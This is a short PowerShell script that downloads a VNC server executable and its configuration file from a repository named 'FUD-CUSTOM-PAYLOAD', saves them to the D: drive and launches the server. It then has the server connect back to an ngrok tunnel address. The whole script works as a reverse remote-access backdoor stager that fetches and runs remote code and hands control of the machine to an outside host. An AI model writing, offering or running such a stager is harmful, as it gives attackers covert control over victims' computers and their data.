# Define URLs and file paths
$exeUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/winvnc.exe"
$iniUrl = "https://github.com/gamkers/FUD-CUSTOM-PAYLOAD/raw/main/UltraVNC.ini"
$exePath = "D:\winvnc.exe"
$iniPath = "D:\UltraVNC.ini"

# Function to download a file
function Download-File {
    param (
        [string]$url,
        [string]$outputPath
    )
    
    Invoke-WebRequest -Uri $url -OutFile $outputPath
}

# Download the EXE file
Download-File -url $exeUrl -outputPath $exePath

# Download the INI file
Download-File -url $iniUrl -outputPath $iniPath

# Execute the EXE file with parameters
Start-Process -FilePath $exePath -ArgumentList "-run"
Start-Process -FilePath $exePath -ArgumentList "-connect 0.tcp.in.ngrok.io:18258"
